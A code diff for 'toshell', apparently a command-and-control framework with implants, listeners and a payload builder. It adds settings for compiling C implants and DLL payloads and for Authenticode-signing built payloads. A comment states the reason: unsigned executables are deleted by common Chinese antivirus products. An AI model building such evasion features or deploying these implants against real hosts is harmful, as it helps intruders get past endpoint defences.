@@ -7,6 +7,7 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"time"
 
 	"toshell/internal/server/auth"
 	"toshell/internal/server/config"
@@ -20,6 +21,7 @@ type SettingsResponse struct {
 	General       map[string]interface{} `json:"general"`
 	Listener      map[string]interface{} `json:"listener"`
 	Implant       map[string]interface{} `json:"implant"`
+	Builder       map[string]interface{} `json:"builder"`
 	Notifications map[string]interface{} `json:"notifications"`
 	Security      map[string]interface{} `json:"security"`
 	AI            map[string]interface{} `json:"ai"`
@@ -28,12 +30,40 @@ type SettingsResponse struct {
 
 // SettingsUpdate 设置页 PUT 请求体（均为可选，缺省不修改）。
 type SettingsUpdate struct {
+	General       *settingsGeneralUpdate  `json:"general"`
 	Listener      *settingsListenerUpdate `json:"listener"`
 	Implant       *settingsImplantUpdate  `json:"implant"`
+	Builder       *settingsBuilderUpdate  `json:"builder"`
 	Notifications *settingsWebhookUpdate  `json:"notifications"`
 	Security      *settingsSecurityUpdate `json:"security"`
 	AI            *settingsAIUpdate       `json:"ai"`
 	Web           *settingsWebUpdate      `json:"web"`
+}
+
+// settingsGeneralUpdate 通用/服务段（此前只读，v1.3.5 起可写；改端口/主机需重启生效）。
+type settingsGeneralUpdate struct {
+	APIHost          *string `json:"api_host"`
+	APIPort          *uint16 `json:"api_port"`
+	LogLevel         *string `json:"log_level"`
+	LogFormat        *string `json:"log_format"`
+	HeartbeatTimeout *string `json:"heartbeat_timeout"`
+	WriteQueueSize   *int    `json:"write_queue_size"`
+}
+
+// settingsBuilderUpdate 载荷构建段（v1.3.5 新增）：
+//   - mingw_gcc_path：C 植入端 / DLL 载荷用的 mingw-w64 gcc（留空自动探测，DLL 要求架构一致）；
+//   - sign_*：构建后 Authenticode 代码签名（未签名的新 PE 在装有 360/电脑管家的主机上
+//     会被拒绝执行并删除）。密码只写不回显：传空串 = 保持不变，传 "clear" = 清除。
+type settingsBuilderUpdate struct {
+	MingwGCCPath     *string `json:"mingw_gcc_path"`
+	SignEnabled      *bool   `json:"sign_enabled"`
+	SignPFXPath      *string `json:"sign_pfx_path"`
+	SignPFXPassword  *string `json:"sign_pfx_password"`
+	SignThumbprint   *string `json:"sign_thumbprint"`
+	SignTimestampURL *string `json:"sign_timestamp_url"`
+	SignSigntoolPath *string `json:"sign_signtool_path"`
+	SignDescription  *string `json:"sign_description"`
+	SignFailClosed   *bool   `json:"sign_fail_closed"`
 }
 
 // settingsWebUpdate Web 控制台防护（防测绘）更新项。
@@ -96,6 +126,10 @@ type settingsWebhookUpdate struct {
 type settingsSecurityUpdate struct {
 	AdminUsername *string `json:"admin_username"`
 	NewPassword   *string `json:"new_password"` // 明文新密码，保存时 bcrypt 哈希
+	// 认证开关（v1.3.5 起可写）：三者不能同时关闭，否则谁都进不来（保存时拦下并报错）。
+	AuthEnabled   *bool `json:"auth_enabled"`
+	JWTEnabled    *bool `json:"jwt_enabled"`
+	APIKeyEnabled *bool `json:"api_key_enabled"`
 	// API Keys 管理（可选，三种动作可组合）：
 	// api_keys        整组替换（传 []string 或空数组清空；null=不改动）
 	// rotate_api_key  一键轮换：生成新 key 追加到列表（保留旧 key 宽限期）
@@ -142,6 +176,18 @@ func (s *Server) getSettingsHandler(w http.ResponseWriter, r *http.Request) {
 			"working_hours":     cfg.Implant.WorkingHours,
 			"startup_delay_min": cfg.Implant.StartupDelayMin,
 			"startup_delay_max": cfg.Implant.StartupDelayMax,
+		},
+		Builder: map[string]interface{}{
+			"mingw_gcc_path": cfg.Builder.MingwGCCPath,
+			"sign_enabled":   cfg.Builder.SignEnabled,
+			"sign_pfx_path":  cfg.Builder.SignPFXPath,
+			// 密码只回传"是否已设置"，绝不回传明文（config 侧也是 json:"-"）
+			"sign_pfx_password_set": strings.TrimSpace(cfg.Builder.SignPFXPassword) != "",
+			"sign_thumbprint":       cfg.Builder.SignThumbprint,
+			"sign_timestamp_url":    cfg.Builder.SignTimestampURL,
+			"sign_signtool_path":    cfg.Builder.SignSigntoolPath,
+			"sign_description":      cfg.Builder.SignDescription,
+			"sign_fail_closed":      cfg.Builder.SignFailClosed,
 		},
 		Notifications: map[string]interface{}{
 			"enabled":     cfg.Webhook.Enabled,
@@ -355,6 +401,30 @@ func (s *Server) updateSettingsHandler(w http.ResponseWriter, r *http.Request) {
 		if sec.AdminUsername != nil && *sec.AdminUsername != "" {
 			updates["auth.admin_username"] = *sec.AdminUsername
 		}
+		// ── 认证开关：允许调整，但不允许把三种认证全部关掉（否则控制台直接失守）──
+		if sec.AuthEnabled != nil || sec.JWTEnabled != nil || sec.APIKeyEnabled != nil {
+			cur := config.Get()
+			authOn, jwtOn, keyOn := true, true, true
+			if cur != nil {
+				authOn, jwtOn, keyOn = cur.Auth.Enabled, cur.Auth.JWTEnabled, cur.Auth.APIKeyEnabled
+			}
+			if sec.AuthEnabled != nil {
+				authOn = *sec.AuthEnabled
+				updates["auth.enabled"] = authOn
+			}
+			if sec.JWTEnabled != nil {
+				jwtOn = *sec.JWTEnabled
+				updates["auth.jwt_enabled"] = jwtOn
+			}
+			if sec.APIKeyEnabled != nil {
+				keyOn = *sec.APIKeyEnabled
+				updates["auth.api_key_enabled"] = keyOn
+			}
+			if !authOn && !jwtOn && !keyOn {
+				http.Error(w, `{"error":"auth.enabled / jwt_enabled / api_key_enabled 不能同时关闭：至少保留一种认证方式，否则控制台将无法登录"}`, http.StatusBadRequest)
+				return
+			}
+		}
 		if sec.NewPassword != nil && *sec.NewPassword != "" {
 			if len(*sec.NewPassword) < 8 {
 				http.Error(w, `{"error":"新密码至少 8 位"}`, http.StatusBadRequest)
@@ -481,6 +551,100 @@ func (s *Server) updateSettingsHandler(w http.ResponseWriter, r *http.Request) {
 				}
 			}
 			updates["ai.download_allowlist"] = cleaned
+		}
+	}
+
+	// ── 通用/服务段（v1.3.5 起可写；端口与队列大小需重启生效）──
+	if g := upd.General; g != nil {
+		if g.APIHost != nil {
+			updates["server.api_host"] = strings.TrimSpace(*g.APIHost)
+			hot = false
+		}
+		if g.APIPort != nil {
+			if *g.APIPort == 0 {
+				http.Error(w, `{"error":"api_port 非法"}`, http.StatusBadRequest)
+				return
+			}
+			updates["server.api_port"] = *g.APIPort
+			hot = false
+		}
+		if g.LogLevel != nil {
+			lv := strings.ToLower(strings.TrimSpace(*g.LogLevel))
+			switch lv {
+			case "debug", "info", "warn", "warning", "error":
+			default:
+				http.Error(w, `{"error":"log_level 仅支持 debug/info/warn/error"}`, http.StatusBadRequest)
+				return
+			}
+			updates["logging.level"] = lv
+		}
+		if g.LogFormat != nil {
+			f := strings.ToLower(strings.TrimSpace(*g.LogFormat))
+			if f != "json" && f != "text" && f != "console" {
+				http.Error(w, `{"error":"log_format 仅支持 json/text"}`, http.StatusBadRequest)
+				return
+			}
+			updates["logging.format"] = f
+		}
+		if g.HeartbeatTimeout != nil {
+			d, err := time.ParseDuration(strings.TrimSpace(*g.HeartbeatTimeout))
+			if err != nil || d <= 0 {
+				http.Error(w, `{"error":"heartbeat_timeout 非法（示例: 60s / 2m）"}`, http.StatusBadRequest)
+				return
+			}
+			// 判活阈值本身就是"按会话自适应（max(配置, 3×实测间隔)）"，改完立即对新会话生效
+			updates["listener.heartbeat_timeout"] = d.String()
+		}
+		if g.WriteQueueSize != nil {
+			if *g.WriteQueueSize < 64 {
+				http.Error(w, `{"error":"write_queue_size 太小（建议 >= 1024）"}`, http.StatusBadRequest)
+				return
+			}
+			updates["listener.write_queue_size"] = *g.WriteQueueSize
+			hot = false
+		}
+	}
+
+	// ── 载荷构建与代码签名段（v1.3.5）──
+	if bd := upd.Builder; bd != nil {
+		if bd.MingwGCCPath != nil {
+			updates["builder.mingw_gcc_path"] = strings.TrimSpace(*bd.MingwGCCPath)
+		}
+		if bd.SignEnabled != nil {
+			updates["builder.sign_enabled"] = *bd.SignEnabled
+		}
+		if bd.SignPFXPath != nil {
+			updates["builder.sign_pfx_path"] = strings.TrimSpace(*bd.SignPFXPath)
+		}
+		if bd.SignPFXPassword != nil {
+			// 约定：空串=保持原值（前端不回显密码，自然也不会提交）；"clear"=清除
+			pw := *bd.SignPFXPassword
+			switch {
+			case pw == "clear":
+				updates["builder.sign_pfx_password"] = ""
+			case strings.TrimSpace(pw) != "" && !strings.Contains(pw, "****"):
+				updates["builder.sign_pfx_password"] = pw
+			}
+		}
+		if bd.SignThumbprint != nil {
+			updates["builder.sign_thumbprint"] = strings.TrimSpace(*bd.SignThumbprint)
+		}
+		if bd.SignTimestampURL != nil {
+			ts := strings.TrimSpace(*bd.SignTimestampURL)
+			if ts != "" && !strings.HasPrefix(ts, "http://") && !strings.HasPrefix(ts, "https://") {
+				http.Error(w, `{"error":"sign_timestamp_url 需以 http(s):// 开头"}`, http.StatusBadRequest)
+				return
+			}
+			updates["builder.sign_timestamp_url"] = ts
+		}
+		if bd.SignSigntoolPath != nil {
+			updates["builder.sign_signtool_path"] = strings.TrimSpace(*bd.SignSigntoolPath)
+		}
+		if bd.SignDescription != nil {
+			updates["builder.sign_description"] = strings.TrimSpace(*bd.SignDescription)
+		}
+		if bd.SignFailClosed != nil {
+			updates["builder.sign_fail_closed"] = *bd.SignFailClosed
 		}
 	}
 
